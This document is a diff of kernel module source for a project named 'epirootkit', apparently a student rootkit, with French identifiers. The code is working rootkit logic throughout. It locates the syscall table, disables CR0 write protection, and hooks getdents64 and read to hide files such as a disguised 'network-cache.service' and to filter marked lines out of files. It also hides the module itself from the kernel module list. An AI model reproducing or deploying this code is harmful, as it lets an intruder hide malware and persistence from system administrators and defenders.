@@ -10,234 +10,255 @@
 #include <linux/fs.h>
 #include "dissimulation.h"
 
-static unsigned long *table_syscalls = NULL;
-static asmlinkage long (*getdents64_original)(const struct pt_regs *);
-static asmlinkage long (*read_original)(const struct pt_regs *);
+typedef asmlinkage long (*syscall_ptr_t)(const struct pt_regs *);
 
-static char *fichiers_a_cacher[] = {
+struct systeme_camouflage {
+    unsigned long *table_appels_systeme;
+    syscall_ptr_t lecture_originale;
+    syscall_ptr_t listage_originale;
+    int actif;
+};
+
+static struct systeme_camouflage camouflage = {0};
+
+static const char *elements_a_dissimuler[] = {
     "fichiercache",
-    "network-cache.service",
+    "network-cache.service", 
     "network-cache.conf",
     "epirootkit",
     NULL
 };
 
-static char *lignes_a_masquer[] = {
+static const char *texte_a_filtrer[] = {
     "cette ligne est cache",
     NULL
 };
 
-static int fichier_doit_etre_cache(const char *nom)
+static int verifier_nom_interdit(const char *nom_fichier)
 {
-    int i;
-    for (i = 0; fichiers_a_cacher[i] != NULL; i++) {
-        if (strstr(nom, fichiers_a_cacher[i])) {
+    int compteur = 0;
+    while (elements_a_dissimuler[compteur]) {
+        if (strstr(nom_fichier, elements_a_dissimuler[compteur]))
             return 1;
-        }
+        compteur++;
     }
     return 0;
 }
 
-static int ligne_doit_etre_masquee(const char *ligne)
+static int verifier_ligne_interdite(const char *contenu_ligne)
 {
-    int i;
-    for (i = 0; lignes_a_masquer[i] != NULL; i++) {
-        if (strstr(ligne, lignes_a_masquer[i])) {
+    int position = 0;
+    while (texte_a_filtrer[position]) {
+        if (strstr(contenu_ligne, texte_a_filtrer[position]))
             return 1;
-        }
+        position++;
     }
     return 0;
 }
 
-static asmlinkage long hook_getdents64(const struct pt_regs *regs)
+static asmlinkage long intercepter_lecture_repertoire(const struct pt_regs *registres)
 {
-    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
-    struct linux_dirent64 *kdent, *current_dir, *previous_dir = NULL;
-    long ret;
-    unsigned long offset = 0;
+    struct linux_dirent64 __user *listing_utilisateur;
+    struct linux_dirent64 *tampon_noyau, *entree_courante, *entree_precedente;
+    long taille_retour;
+    unsigned long decalage;
     
-    ret = getdents64_original(regs);
-    if (ret <= 0)
-        return ret;
+    listing_utilisateur = (struct linux_dirent64 __user *)registres->si;
+    taille_retour = camouflage.listage_originale(registres);
     
-    kdent = kmalloc(ret, GFP_KERNEL);
-    if (!kdent)
-        return ret;
+    if (taille_retour <= 0)
+        return taille_retour;
     
-    if (copy_from_user(kdent, dirent, ret)) {
-        kfree(kdent);
-        return ret;
+    tampon_noyau = kmalloc(taille_retour, GFP_KERNEL);
+    if (!tampon_noyau)
+        return taille_retour;
+    
+    if (copy_from_user(tampon_noyau, listing_utilisateur, taille_retour)) {
+        kfree(tampon_noyau);
+        return taille_retour;
     }
     
-    while (offset < ret) {
-        current_dir = (void *)kdent + offset;
+    decalage = 0;
+    entree_precedente = NULL;
+    
+    while (decalage < taille_retour) {
+        entree_courante = (struct linux_dirent64 *)((char *)tampon_noyau + decalage);
         
-        if (fichier_doit_etre_cache(current_dir->d_name)) {
-            if (previous_dir != NULL) {
-                previous_dir->d_reclen += current_dir->d_reclen;
+        if (verifier_nom_interdit(entree_courante->d_name)) {
+            if (entree_precedente) {
+                entree_precedente->d_reclen += entree_courante->d_reclen;
             } else {
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret - offset);
+                taille_retour -= entree_courante->d_reclen;
+                memmove(entree_courante, 
+                       (char *)entree_courante + entree_courante->d_reclen,
+                       taille_retour - decalage);
                 continue;
             }
         } else {
-            previous_dir = current_dir;
+            entree_precedente = entree_courante;
         }
         
-        offset += current_dir->d_reclen;
+        decalage += entree_courante->d_reclen;
     }
     
-    copy_to_user(dirent, kdent, ret);
-    kfree(kdent);
-    return ret;
+    copy_to_user(listing_utilisateur, tampon_noyau, taille_retour);
+    kfree(tampon_noyau);
+    return taille_retour;
 }
 
-static asmlinkage long hook_read(const struct pt_regs *regs)
+static asmlinkage long intercepter_lecture_fichier(const struct pt_regs *registres)
 {
-    int fd = (int)regs->di;
-    char __user *buf = (char __user *)regs->si;
-    long resultat;
-    char *kbuf;
+    int descripteur_fichier;
+    char __user *tampon_utilisateur;
+    char *tampon_lecture, *tampon_filtre;
     char *debut_ligne, *fin_ligne;
-    char *buffer_propre;
-    size_t taille_propre = 0;
-    struct file *fichier;
-    char *nom_fichier;
-    char chemin_buffer[PATH_MAX];
+    char chemin_fichier[PATH_MAX];
+    char *nom_chemin;
+    struct file *fichier_ouvert;
+    long octets_lus;
+    size_t taille_filtree;
     
-    resultat = read_original(regs);
-    if (resultat <= 0)
-        return resultat;
+    descripteur_fichier = (int)registres->di;
+    tampon_utilisateur = (char __user *)registres->si;
     
-    fichier = fget(fd);
-    if (!fichier)
-        return resultat;
+    octets_lus = camouflage.lecture_originale(registres);
+    if (octets_lus <= 0)
+        return octets_lus;
     
-    nom_fichier = d_path(&fichier->f_path, chemin_buffer, PATH_MAX);
-    fput(fichier);
+    fichier_ouvert = fget(descripteur_fichier);
+    if (!fichier_ouvert)
+        return octets_lus;
     
-    if (IS_ERR(nom_fichier))
-        return resultat;
+    nom_chemin = d_path(&fichier_ouvert->f_path, chemin_fichier, PATH_MAX);
+    fput(fichier_ouvert);
     
-    if (!strstr(nom_fichier, "lignescache")) {
-        return resultat;
+    if (IS_ERR(nom_chemin) || !strstr(nom_chemin, "lignescache"))
+        return octets_lus;
+    
+    tampon_lecture = kzalloc(octets_lus + 1, GFP_KERNEL);
+    if (!tampon_lecture)
+        return octets_lus;
+    
+    if (copy_from_user(tampon_lecture, tampon_utilisateur, octets_lus)) {
+        kfree(tampon_lecture);
+        return octets_lus;
     }
     
-    kbuf = kzalloc(resultat + 1, GFP_KERNEL);
-    if (!kbuf)
-        return resultat;
-    
-    if (copy_from_user(kbuf, buf, resultat)) {
-        kfree(kbuf);
-        return resultat;
+    tampon_filtre = kzalloc(octets_lus + 1, GFP_KERNEL);
+    if (!tampon_filtre) {
+        kfree(tampon_lecture);
+        return octets_lus;
     }
     
-    buffer_propre = kzalloc(resultat + 1, GFP_KERNEL);
-    if (!buffer_propre) {
-        kfree(kbuf);
-        return resultat;
-    }
+    taille_filtree = 0;
+    debut_ligne = tampon_lecture;
     
-    debut_ligne = kbuf;
-    while (debut_ligne < kbuf + resultat) {
+    while (debut_ligne < tampon_lecture + octets_lus) {
         fin_ligne = strchr(debut_ligne, '\n');
         if (!fin_ligne)
-            fin_ligne = kbuf + resultat;
+            fin_ligne = tampon_lecture + octets_lus;
         
-        if (!ligne_doit_etre_masquee(debut_ligne)) {
-            size_t longueur_ligne = fin_ligne - debut_ligne;
-            if (fin_ligne < kbuf + resultat)
-                longueur_ligne++;
+        if (!verifier_ligne_interdite(debut_ligne)) {
+            size_t longueur = fin_ligne - debut_ligne;
+            if (fin_ligne < tampon_lecture + octets_lus)
+                longueur++;
             
-            if (taille_propre + longueur_ligne <= resultat) {
-                memcpy(buffer_propre + taille_propre, debut_ligne, longueur_ligne);
-                taille_propre += longueur_ligne;
+            if (taille_filtree + longueur <= octets_lus) {
+                memcpy(tampon_filtre + taille_filtree, debut_ligne, longueur);
+                taille_filtree += longueur;
             }
         }
         
         debut_ligne = fin_ligne + 1;
     }
     
-    if (copy_to_user(buf, buffer_propre, taille_propre))
-        resultat = -EFAULT;
+    if (copy_to_user(tampon_utilisateur, tampon_filtre, taille_filtree))
+        octets_lus = -EFAULT;
     else
-        resultat = taille_propre;
+        octets_lus = taille_filtree;
     
-    kfree(kbuf);
-    kfree(buffer_propre);
-    return resultat;
+    kfree(tampon_lecture);
+    kfree(tampon_filtre);
+    return octets_lus;
 }
 
-static unsigned long *obtenir_table_syscalls(void)
+static unsigned long *localiser_table_appels(void)
 {
-    unsigned long *table_syscalls;
+    unsigned long *table_trouvee;
     
-    table_syscalls = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-    if (!table_syscalls) {
-        pr_err("epirootkit: Impossible de trouver sys_call_table\n");
+    table_trouvee = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    if (!table_trouvee) {
+        pr_err("epirootkit: Echec localisation table syscalls\n");
         return NULL;
     }
     
-    return table_syscalls;
+    pr_info("epirootkit: Table syscalls localisee\n");
+    return table_trouvee;
 }
 
-static void desactiver_protection_page(void)
+static void modifier_protection_memoire(int desactiver)
 {
-    unsigned long valeur;
-    asm volatile("mov %%cr0, %0" : "=r" (valeur));
+    unsigned long registre_controle;
     
-    if (valeur & 0x00010000) {
-        valeur &= ~0x00010000;
-        asm volatile("mov %0, %%cr0" : : "r" (valeur));
+    asm volatile("mov %%cr0, %0" : "=r" (registre_controle));
+    
+    if (desactiver) {
+        registre_controle &= ~0x00010000;
+    } else {
+        registre_controle |= 0x00010000;
     }
-}
-
-static void activer_protection_page(void)
-{
-    unsigned long valeur;
-    asm volatile("mov %%cr0, %0" : "=r" (valeur));
-    valeur |= 0x00010000;
-    asm volatile("mov %0, %%cr0" : : "r" (valeur));
+    
+    asm volatile("mov %0, %%cr0" : : "r" (registre_controle));
 }
 
 void cacher_module(void)
 {
+    pr_info("epirootkit: Masquage module en cours\n");
     list_del(&THIS_MODULE->list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
+    pr_info("epirootkit: Module masque avec succes\n");
 }
 
 int activer_dissimulation(void)
 {
-    table_syscalls = obtenir_table_syscalls();
-    if (!table_syscalls) {
-        pr_err("epirootkit: Impossible de trouver la table des syscalls\n");
+    pr_info("epirootkit: Activation systeme dissimulation\n");
+    
+    camouflage.table_appels_systeme = localiser_table_appels();
+    if (!camouflage.table_appels_systeme) {
+        pr_err("epirootkit: Impossible d'activer la dissimulation\n");
         return -1;
     }
     
-    getdents64_original = (void *)table_syscalls[__NR_getdents64];
-    read_original = (void *)table_syscalls[__NR_read];
+    camouflage.listage_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_getdents64];
+    camouflage.lecture_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_read];
     
-    desactiver_protection_page();
+    modifier_protection_memoire(1);
     
-    table_syscalls[__NR_getdents64] = (unsigned long)hook_getdents64;
-    table_syscalls[__NR_read] = (unsigned long)hook_read;
+    camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)intercepter_lecture_repertoire;
+    camouflage.table_appels_systeme[__NR_read] = (unsigned long)intercepter_lecture_fichier;
     
-    activer_protection_page();
+    modifier_protection_memoire(0);
     
-    pr_info("epirootkit: Hooks installes\n");
+    camouflage.actif = 1;
+    pr_info("epirootkit: Dissimulation active - fichiers et lignes masques\n");
+    
     return 0;
 }
 
 void desactiver_dissimulation(void)
 {
-    if (table_syscalls && getdents64_original && read_original) {
-        desactiver_protection_page();
-        
-        table_syscalls[__NR_getdents64] = (unsigned long)getdents64_original;
-        table_syscalls[__NR_read] = (unsigned long)read_original;
-        
-        activer_protection_page();
-        
-        pr_info("epirootkit: Hooks supprimes\n");
-    }
+    if (!camouflage.actif || !camouflage.table_appels_systeme)
+        return;
+    
+    pr_info("epirootkit: Desactivation systeme dissimulation\n");
+    
+    modifier_protection_memoire(1);
+    
+    camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)camouflage.listage_originale;
+    camouflage.table_appels_systeme[__NR_read] = (unsigned long)camouflage.lecture_originale;
+    
+    modifier_protection_memoire(0);
+    
+    camouflage.actif = 0;
+    pr_info("epirootkit: Dissimulation desactivee\n");
 }
